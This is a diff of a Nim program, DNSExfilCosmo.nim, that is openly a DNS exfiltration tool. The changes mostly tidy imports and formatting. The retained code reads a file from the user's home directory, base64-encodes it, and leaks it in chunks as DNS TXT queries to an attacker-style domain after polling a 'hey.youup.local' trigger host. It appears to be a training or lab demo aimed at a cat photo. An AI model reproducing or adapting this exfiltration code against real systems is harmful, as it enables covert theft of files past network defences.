@@ -1,4 +1,4 @@
-#[    
+#[
     Debug:
         nim c --d:mingw --d:debug --app=console DNSExfilCosmo.nim
 
@@ -28,23 +28,17 @@ Something like this :
 import dnsclient
 import os
 from base64 import encode
-import streams
 import strutils
-import osproc
 import std/httpclient
-import std/strformat
-import std/random
 
 const CHUNK_SIZE = 62
-
 
 # Globals
 var homeDir = getHomeDir()
 let domainName = ".cosmosfurbootsemporium.local"
 let authNS = "auth.ns.local"
 
-
-proc hey_you_up(): bool = 
+proc hey_you_up(): bool =
     var client = newHttpClient()
     var res =  client.request("http://hey.youup.local")
     let response = res.status
@@ -53,9 +47,7 @@ proc hey_you_up(): bool =
         sleep (3000)
         return true
 
-
 proc dnsExfilCosmo(): void =
-    
     let target = homeDir & r"Desktop\cosmo.jpeg"
     var content = readFile(target)
     let b64 = encode(content, safe=true)
@@ -67,7 +59,7 @@ proc dnsExfilCosmo(): void =
             var query =  b64[stringindex .. (if stringindex + CHUNK_SIZE - 1 > b64.len - 1: b64.len - 1 else: stringindex + CHUNK_SIZE - 1)]
             let client = newDNSClient(authNS)
             var dnsquery = query & domainName
-            let resp = client.sendQuery(dnsquery, TXT)
+            discard(client.sendQuery(dnsquery, TXT))
             stringindex += CHUNK_SIZE
             sleep(10)
         except:
@@ -87,5 +79,3 @@ when isMainModule:
         quit()
     finally:
         quit()
-    dnsExfilCosmo()
-
